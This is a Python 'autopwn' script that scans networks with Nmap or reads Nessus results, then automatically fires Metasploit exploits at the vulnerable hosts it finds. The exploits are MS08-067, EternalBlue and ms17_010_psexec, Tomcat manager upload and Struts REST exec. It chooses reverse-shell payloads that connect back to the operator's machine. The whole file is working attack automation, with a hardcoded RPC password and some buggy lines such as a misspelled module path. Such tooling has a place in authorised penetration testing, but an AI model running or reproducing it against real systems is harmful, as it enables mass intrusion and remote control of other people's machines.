#!/usr/bin/env python3

import re
import os
import sys
import time
import msfrpc
import argparse
import netifaces
from IPython import embed
from termcolor import colored
from libnmap.process import NmapProcess
from libnessus.parser import NessusParser
from netaddr import IPNetwork, AddrFormatError
from subprocess import Popen, PIPE, CalledProcessError
from libnmap.parser import NmapParser, NmapParserException
from libnessus.parser import NessusParser

CLIENT = msfrpc.Msfrpc({})

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-p", "--password", default='Au70PwN', help="Password for msfrpc")
    parser.add_argument("-u", "--username", default='msf', help="Username for msfrpc")
    parser.add_argument("-x", "--xml", help="Nmap XML file")
    parser.add_argument("-n", "--nessus", help="Nessus .nessus file")
    parser.add_argument("--nmap-args", default='', help='Additional Nmap args, e.g. --nmap-args="--top-ports 1000 --max-rtt-timeout 300"')
    return parser.parse_args()

# Colored terminal output
def print_bad(msg):
    print((colored('[-] ', 'red') + msg))

def print_info(msg):
    print((colored('[*] ', 'blue') + msg))

def print_good(msg):
    print((colored('[+] ', 'green') + msg))

def print_great(msg):
    print((colored('[!] {}'.format(msg), 'yellow', attrs=['bold'])))

def run_proc(cmd):
    '''
    Runs single commands
    '''
    cmd_split = cmd.split()
    print_info('Running: {}'.format(cmd))
    proc = Popen(cmd_split, stdout=PIPE, stderr=PIPE)

    return proc

def get_exploitable_hosts(report):
    '''
    Parses .nessus files for vulnerabilities that metasploit can exploit
    '''
    exploits = {}

    for i in report.hosts:
        operating_sys = i.get_host_properties['operating-system']
        rep_items = i.get_report_items
        for x in rep_items:
            vuln_info = x.get_vuln_info
            severity = x.severity
            if int(severity) > 2:
                if 'exploit_framework_metasploit' in vuln_info:
                    if vuln_info['exploit_framework_metasploit'] == 'true':
                        ip = i.address
                        port = vuln_info['port']
                        msf_mod = vuln_info['metasploit_name']
                        print_good('Found vulnerable host! {}:{} - {}'.format(ip, port, msf_mod))

                        if msf_mod in exploits:
                            exploits[msf_mod].append((operating_sys, ip, port))
                        else:
                            exploits[msf_mod] = [(operating_sys, ip, port)]

    return exploits

def parse_nmap(args):
    '''
    Either performs an Nmap scan or parses an Nmap xml file
    Will either return the parsed report or exit script
    '''
    if args.xml:
        try:
            report = NmapParser.parse_fromfile(args.xml)
        except IOError:
            print_bad('Host file not found: {}'.format(args.xml))
            sys.exit()

    elif args.hostlist:
        hosts = []
        with open(args.hostlist, 'r') as hostlist:
            host_lines = hostlist.readlines()
            for line in host_lines:
                line = line.strip()
                try:
                    if '/' in line:
                        hosts += [str(ip) for ip in IPNetwork(line)]
                    elif '*' in line:
                        print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24')
                        sys.exit()
                    else:
                        hosts.append(line)
                except (OSError, AddrFormatError):
                    print_bad('Error importing host list file. Are you sure you chose the right file?')
                    sys.exit()

        report = nmap_scan(hosts, 'autopwn-scan', args.nmap_args)

    else:
        print_bad('Specify hostlist with: -l <hostlist.txt>')
        sys.exit()

    return report

def nmap_scan(hosts, outfile, add_args):
    '''
    Do Nmap scan
    '''
    nmap_args = '-sS -O -T4 -sV -n {} --max-retries 5 -oA {}'.format(add_args, outfile)
    print_info('Running: nmap {}'.format(nmap_args))
    nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
    rc = nmap_proc.sudo_run_background()
    nmap_status_printer(nmap_proc)
    report = NmapParser.parse_fromfile(os.getcwd()+'/{}.xml'.format(outfile))

    return report

def nmap_status_printer(nmap_proc):
    '''
    Prints that Nmap is running
    '''
    i = -1
    x = -.5
    while nmap_proc.is_running():
        i += 1
        # Every 30 seconds print that Nmap is still running
        if i % 30 == 0:
            x += .5
            print_info("Nmap running: {} min".format(str(x)))

        time.sleep(1)

def get_nmap_os(host):
    '''
    Gets Nmap's guess of OS
    '''
    nmap_os_raw = host.os_class_probabilities()
    if len(nmap_os_raw) > 0:
        nmap_os = str(nmap_os_raw[0]).split(':')[1].split('\r\n')[0].strip()
    else:
        # Default to Windows
        nmap_os = 'Nmap unable to guess OS; defaulting to Windows'
    return nmap_os

def get_hosts(report, nse):
    '''
    Prints host data
    '''
    hosts = []

    print_info('Parsing hosts')
    for host in report.hosts:
        if host.is_up():
            ip = host.address

            nmap_os = get_nmap_os(host)

            if nse == False:
                print_info('{} - OS: {}'.format(ip, nmap_os))

            for s in host.services:
                if s.open():

                    if host not in hosts:
                        hosts.append(host)

                    if 'product: ' in s.banner:
                        banner = s.banner.split('product: ')[1]
                    else:
                        banner = s.banner

                    port = str(s.port)

                    if nse == False:
                        print('          {} - {}'.format(port, banner))


    if nse == False:
        if len(hosts) == 0:
            print_bad('No hosts found')
            sys.exit()

    return hosts

def check_named_pipes(c_id, ip, nmap_os):
    '''
    If we can avoid EternalBlue we will because EternalRomance/Synergy
    works on more versions of Windows
    If we can get a named pipe then we'll use Romance/Synergy over Blue
    '''
    pipes = None
    path = 'auxiliary/scanner/smb/pipe_auditor'
    rhost_var = get_rhost_var(c_id, path)
    port = '445'
    opts = ''
    payload = get_payload(path, nmap_os)
    cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
    mod_out = run_console_cmd(c_id, cmd)

    # Example output:
    '''
    ['RHOSTS => 192.168.243.129',
       '[*] 192.168.243.129:445   - Pipes: \\netlogon, \\lsarpc, \\samr, \\atsvc, \\epmapper, \\eventlog, \\InitShutdown, \\lsass, \\LSM_API_service, \\ntsvcs, \\protected_storage, \\scerpc, \\srvsvc, \\W32TIME_ALT, \\wkssvc',
       '[*] Scanned 1 of 1 hosts (100% complete)['consoles'],
       '[*] Auxiliary module execution completed']
    '''

    for l in mod_out:
        delim = 'Pipes: '
        if delim in l:
            pipes = l.split(delim)[1].split(', ')

    return pipes

def get_iface():
    '''
    Gets the right interface for Responder
    '''
    try:
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    except:
        ifaces = []
        for iface in netifaces.interfaces():
            # list of ipv4 addrinfo dicts
            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])

            for entry in ipv4s:
                addr = entry.get('addr')
                if not addr:
                    continue
                if not (iface.startswith('lo') or addr.startswith('127.')):
                    ifaces.append(iface)

        iface = ifaces[0]

    return iface

def get_local_ip(iface):
    '''
    Gets the the local IP of an interface
    '''
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip

def create_msf_cmd(module_path, rhost_var, ip, port, payload, extra_opts):
    '''
    You can set arbitrary options that don't get used which is why we autoinclude
    ExitOnSession True; even if we use aux module this just won't do anything
    '''
    local_ip = get_local_ip(get_iface())
    print_info('Setting options on {}'.format(module_path))
    cmds = """
           use {}\n
           set {} {}\n
           set RPORT {}\n
           set LHOST {}\n
           set payload {}\n
           {}\n
           set ExitOnSession True\n
           """.format(module_path, rhost_var, ip, port, local_ip, payload, extra_opts)

    return cmds

def run_console_cmd(c_id, cmd):
    '''
    Runs module and gets output
    '''
    print_info('Running MSF command(s):')
    for l in cmd.splitlines():
        l = l.strip()
        if l != '':
            print_info('    {}'.format(l))
    print('')
    CLIENT.call('console.write',[c_id, cmd])
    time.sleep(3)
    mod_output = wait_on_busy_console(c_id)
    print('')

    return mod_output

def get_req_opts(c_id, module):
    req_opts = []
    opts = CLIENT.call('module.options', [c_id, module])
    for opt_name in opts:
        if b'required' in opts[opt_name]:
            if opts[opt_name][b'required'] == True:
                if b'default' not in opts[opt_name]:
                    req_opts.append(opt_name.decode('utf8'))
    return req_opts

def get_rhost_var(c_id, module):
    req_opts = get_req_opts(c_id, module)
    for o in req_opts:
        # Just handle the one req opt I can find that we might use that's not RHOST(S)
        if 'RHOST' in o:
            return o
    print_bad('Could not get RHOST var')
    print_bad('List of required options:')
    for o in req_opts:
        print_info(o)

def get_payload(module, operating_sys):
    '''
    Automatically get compatible payloads
    '''
    payload = None
    payloads = []
    win_payloads = ['windows/meterpreter/reverse_https',
                    'windows/x64/meterpreter/reverse_https',
                    'java/meterpreter/reverse_https',
                    'java/jsp_shell_reverse_tcp']

    unix_payloads = ['java/meterpreter/reverse_https',
                     'java/jsp_shell_reverse_tcp',
                     'cmd/unix/reverse']

    
    payloads_dict = CLIENT.call('module.compatible_payloads', [module])

    if b'error' in payloads_dict:
        if 'auxiliary' not in module:
            print_bad('Error getting payload for {}'.format(module))
        else:
            # For aux modules we just set an arbitrary real payload
            payload = win_payloads[0]
    else:
        byte_payloads = payloads_dict[b'payloads']
        for p in byte_payloads:
            payloads.append(p.decode('utf8'))

    # Set a preferred payload based on OS
    if 'windows' in operating_sys.lower():
        for p in win_payloads:
            if p in payloads:
                payload = p
    elif 'nix' in operating_sys.lower():
        for p in win_payloads:
            if p in payloads:
                payload = p

    # No preferred payload found. If aux module, just set it to rev_https bc it doesn't matter
    if payload == None:
        if 'auxiliary' not in module:
            print_bad('No preferred payload found, first and last comapatible payloads:')
            print('    '+payloads[0])
            print('    '+payloads[-1])
            print_info('Skipping this exploit')
            return

    return payload

def check_vuln(c_id):
    '''
    Check if the machine is vulnerable
    '''
    # potential messages:
    # Check failed: ..."
    # Cannot reliably check exploitability
    cmd = 'check\n'
    out = run_console_cmd(c_id, cmd)
    not_sure_msgs = ['Cannot reliably check exploitability', 'The state could not be determined']
    if out == []:
        print_info('Unsure if vulnerable, continuing with exploit')
        return True
    for l in out:
        if 'is vulnerable' in l:
            print_good('Vulnerable!')
            return True
        elif any(x in l for x in not_sure_msgs) or l == '':
            print_info('Unsure if vulnerable, continuing with exploit')
            return True

    return False

def run_nessus_exploits(c_id, exploits):
    # There might be a better way to do this but idk it
    # The way MSF search works is with an OR in between words even wrapped in quotes
    # ... dumb.
    print_info("Collecting list of all Metasploit modules...")
    all_mods = CLIENT.call('module.search', ['a e i o u'])
    for mod_desc in exploits:

        # convert mod_desc into mod_path
        path = None
        for mod in all_mods:
            if mod[b'name'].decode('utf8') == mod_desc:
                path = mod[b'fullname'].decode('utf8')
                print_info('Using module {}'.format(path))
        if not path:
            print_bad('Error finding module with description: {}'.format(mod_desc))
            continue

        for operating_sys, ip, port in exploits[mod_desc]:
            payload = get_payload(path, operating_sys)
            if not payload:
                continue
            rhost_var = get_rhost_var(c_id, path)
            opts = ''
            cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
            settings_out = run_console_cmd(c_id, cmd)
            print_info('Checking if host is vulnerable...')
            output = run_if_vuln(c_id, cmd)

def get_nse_scripts(hosts):
    nse_scripts = {}

    for host in hosts:
        ip = host.address
        nmap_os = get_nmap_os(host)
        if 'windows' in nmap_os.lower():
            os_type = 'windows'
        else:
            os_type = 'nix'

        for s in host.services:
            if s.open():
                port = str(s.port)
                ip_port = ip+":"+port

                # Run SMB vuln scripts
                if s.port == 445 and os_type == 'windows':
                    port = str(s.port)
                    smb_scripts = ['smb-vuln-ms17-010', 'smb-vuln-ms08-067']
                    if ip in nse_scripts:
                        nse_scripts[ip][port] = smb_scripts
                    else:
                        nse_scripts[ip] = {port:smb_scripts}

                # Run HTTP scripts
                elif 'http' in s.service:
                    http_scripts = ['http-title']
                    if ip in nse_scripts:
                        nse_scripts[ip][port] = http_scripts
                    else:
                        nse_scripts[ip] = {port:http_scripts}

    return nse_scripts

def run_nse_scripts(nse_scripts):
    '''
    We only run nse scripts after we know its possibly vuln
    '''
    # nse_scripts = {'ip':{'port':['script1', 'script2']}}
    hosts_lst = []
    ports_lst = []
    scripts_lst = []

    for ip in nse_scripts:
        hosts_lst.append(ip)
        for port in nse_scripts[ip]:
            ports_lst.append(port)
            for scripts in nse_scripts[ip][port]:
                scripts_lst.append(scripts)

    ports = ','.join(list(set(ports_lst)))
    scripts = ','.join(list(set(scripts_lst)))

    report = nmap_scan(hosts_lst, 'nse-scan', '-p {} --script {}'.format(ports, scripts))

    return report

def run_nmap_exploits(c_id, hosts, nse_hosts):
    '''
    Checks for exploitable services on a host
    '''
    for nse_host in nse_hosts:

        # Check for host script results
        ms08_vuln = check_nse_host_scripts(nse_host, 'smb-vuln-ms08-067')
        if ms08_vuln:
            mod = 'exploit/windows/smb/ms08_067_netapi'
            port = '445'
            mod_out = run_msf_module(c_id, nse_host, mod, port, '')

        ms17_vuln = check_nse_host_scripts(nse_host, 'smb-vuln-ms17-010')
        if ms17_vuln:
            mod_out = run_ms17(c_id, nse_host)

        # Check for service script results
        for s in nse_host.services:
            if s.open():
                port = str(s.port)
                for script in s.scripts_results:
                    if script['id'] == 'http-title':
                        script_out = script['output']
                        tomcat_vuln = is_tomcat_jsp_upload_vuln(script_out)
                        if tomcat_vuln:
                            mod = 'expoit/multi/http/tomcat_mgr_deploy'
                            mod_out = run_msf_module(c_id, nse_host, mod, port, '')

    # These are the regular first Nmap hosts, no scripts
    for host in hosts:
        for s in host.services:
            if s.open():
                port = str(s.port)
                # Can Struts be run without Tomcat? Maybe, but seems really rare
                if 'Apache Tomcat/Coyote JSP engine' in s.banner:
                    # Struts DMI REST exec
                    struts_mod = 'exploit/multi/http/struts_dmi_rest_exec'
                    mod_out = run_msf_module(c_id, host, struts_mod, port, '')
                    # Tomcat manager upload with default creds
                    tomcat_mgr_mod = 'exploit/multi/http/tomcat_mgr_upload'
                    mod_out = run_msf_module(c_id, host, tomcat_mgr_mod, port, '')

def check_nse_host_scripts(host, script):
    '''
    Check if host if vulnerable via nse script
    '''
    ports = []
    ip = host.address

    for s in host.scripts_results:
        if s['id'] == script:
            if 'State: VULNERABLE' in s['output']:
                print_good('NSE script {} found vulnerable host: {}'.format(script, ip))
                return True

    return False

def run_msf_module(c_id, host, mod, port, extra_opts):
    ip = host.address
    rhost_var = get_rhost_var(c_id, mod)
    nmap_os = get_nmap_os(host)
    payload = get_payload(mod, nmap_os)
    cmd = create_msf_cmd(mod, rhost_var, ip, port, payload, extra_opts)
    settings_out = run_console_cmd(c_id, cmd)
    print_info('Checking if host is vulnerable...')
    output = run_if_vuln(c_id, cmd)

def run_ms17(c_id, host):
    '''
    Exploit ms17_010
    '''
    # Check for named pipe availability (preVista you could just grab em)
    # If we find one, then use Romance/Synergy instead of Blue
    ip = host.address
    port = '445'
    nmap_os = get_nmap_os(host)
    named_pipe = None

    named_pipes = check_named_pipes(c_id, ip, nmap_os)

    # Just use the first named pipe
    if named_pipes:
        print_good('Named pipe found! Performing more reliable ms17_010_psexec instead of eternalblue')
        named_pipe = named_pipes[0]
        mod = 'exploit/windows/smb/ms17_010_psexec'
        extra_opts = 'set NAMEDPIPE {}'.format(named_pipe)
    else:
        print_info('Named pipe not found. Performing ms17_010_eternalblue')
        mod = 'exploit/windows/smb/ms17_010_eternalblue'
        extra_opts = 'set MaxExploitAttempts 6'
    
    mod_out = run_msf_module(c_id, host, mod, port, extra_opts)

    return mod_out

def is_tomcat_jsp_upload_vuln(nse_out):
    tomcat_ver_re = re.search('Tomcat/([1-9]\.[0|5]\.\d+)', nse_out)
    if tomcat_ver_re:
        ver = tomcat_ver_re.group(1)
        if ver in jsp_upload_bypass_tomcat_vers():
            return True
    return False

def run_if_vuln(c_id, cmd):
    is_vulnerable = check_vuln(c_id)
    if is_vulnerable == True:
        exploit_cmd = 'exploit -z\n'
        mod_out = run_console_cmd(c_id, exploit_cmd)

        return mod_out

def print_cur_output(c_id):
    output = []
    cur_output = CLIENT.call('console.read', [c_id])[b'data'].decode('utf8').splitlines()
    for l in cur_output:
        l = l.strip()
        if l != '':
            output.append(l)
            if re.search('Session . created in the background', l):
                print_great(l)
            else:
                print('    '+l)

    return output

def wait_on_busy_console(c_id):
    '''
    The only way to get console busy status is through console.read or console.list
    console.read clears the output buffer so you gotta use console.list
    but console.list requires you know the list offset of the c_id console
    so this ridiculous list comprehension seems necessary to avoid assuming
    what the right list offset might be
    '''
    output = []
    list_offset = int([x[b'id'] for x in CLIENT.call('console.list')[b'consoles'] if x[b'id'] is bytes(c_id, 'utf8')][0])
    # Get any initial output
    cur_out = print_cur_output(c_id)
    output += cur_out
    while CLIENT.call('console.list')[b'consoles'][list_offset][b'busy'] == True:
        cur_out = print_cur_output(c_id)
        output += cur_out
        time.sleep(1)

    # Get remaining output
    cur_out = print_cur_output(c_id)
    output += cur_out

    return output

def main(report, args):
    global CLIENT

    # Authenticate and grab a permanent token
    CLIENT.login(args.username, args.password)
    CLIENT.call('auth.token_add', ['Au70PwN'])
    CLIENT.token = 'Au70PwN'

    c_ids = [x[b'id'] for x in CLIENT.call('console.list')[b'consoles']]

    if len(c_ids) == 0:
        CLIENT.call('console.create')
        c_ids = [x[b'id'] for x in CLIENT.call('console.list')[b'consoles']] # Wait for response
        time.sleep(2)

    # Get the latest console
    c_id = c_ids[-1].decode('utf8')

    if args.nessus:
        # exploits = {'msf_module_name':[(ip, port), (ip, port)]
        exploits = get_exploitable_hosts(report)
        run_nessus_exploits(c_id, exploits)
        remainder_output = wait_on_busy_console(c_id)
    else:
        # hosts = {ip : [(port, banner), (port2, banner2)]
        hosts = get_hosts(report, False)
        nse_scripts = get_nse_scripts(hosts)
        nse_report = run_nse_scripts(nse_scripts)
        nse_hosts = get_hosts(nse_report, True)
        run_nmap_exploits(c_id, hosts, nse_hosts)
        remainder_output = wait_on_busy_console(c_id)

if __name__ == "__main__":
    args = parse_args()
    if os.geteuid():
        print_bad('Run as root')
        sys.exit()
    if args.nessus:
        report = NessusParser.parse_fromfile(args.nessus)
    else:
        report = parse_nmap(args)
    main(report, args)

def jsp_upload_bypass_tomcat_vers():
    return ['9.0.0', '8.5.1',  '8.5.2', '8.5.3', 
            '8.5.4', '8.5.5', '8.5.6', '8.5.7', 
            '8.5.8', '8.5.9', '8.5.10', '8.5.11', 
            '8.5.12', '8.5.13', '8.5.14', '8.5.15', 
            '8.5.16', '8.5.17', '8.5.18', '8.5.19', 
            '8.5.20', '8.5.21', '8.5.22', '8.0.0',
            '8.0.1','8.0.2','8.0.3','8.0.4',
            '8.0.5','8.0.6','8.0.7','8.0.8',
            '8.0.9','8.0.10','8.0.11','8.0.12',
            '8.0.13','8.0.14','8.0.15','8.0.16',
            '8.0.17','8.0.18','8.0.19','8.0.20',
            '8.0.21','8.0.22','8.0.23','8.0.24',
            '8.0.25','8.0.26','8.0.27','8.0.28',
            '8.0.29','8.0.30','8.0.31','8.0.32',
            '8.0.33','8.0.34','8.0.35','8.0.36',
            '8.0.37','8.0.38','8.0.39','8.0.40',
            '8.0.41','8.0.42','8.0.43','8.0.44',
            '8.0.45','8.0.46','7.0.0','7.0.1',
            '7.0.2','7.0.3','7.0.4','7.0.5',
            '7.0.6','7.0.7','7.0.8','7.0.9',
            '7.0.10','7.0.11','7.0.12','7.0.13',
            '7.0.14','7.0.15','7.0.16','7.0.17',
            '7.0.18','7.0.19','7.0.20','7.0.21',
            '7.0.22','7.0.23','7.0.24','7.0.25',
            '7.0.26','7.0.27','7.0.28','7.0.29',
            '7.0.30','7.0.31','7.0.32','7.0.33',
            '7.0.34','7.0.35','7.0.36','7.0.37',
            '7.0.38','7.0.39','7.0.40','7.0.41',
            '7.0.42','7.0.43','7.0.44','7.0.45',
            '7.0.46','7.0.47','7.0.48','7.0.49',
            '7.0.50','7.0.51','7.0.52','7.0.53',
            '7.0.54','7.0.55','7.0.56','7.0.57',
            '7.0.58','7.0.59','7.0.60','7.0.61',
            '7.0.62','7.0.63','7.0.64','7.0.65',
            '7.0.66','7.0.67','7.0.68','7.0.69',
            '7.0.70','7.0.71','7.0.72','7.0.73',
            '7.0.74','7.0.75','7.0.76','7.0.77',
            '7.0.78','7.0.79','7.0.80','7.0.81']


#TODO
# Make Nmap smarter so it only runs NSE scripts that haven't already been ran
# Add nmap http-title reader to determine if tomcat is vuln version
# Add JBoss, Struts, Tomcat, Jenkins, WebSphere
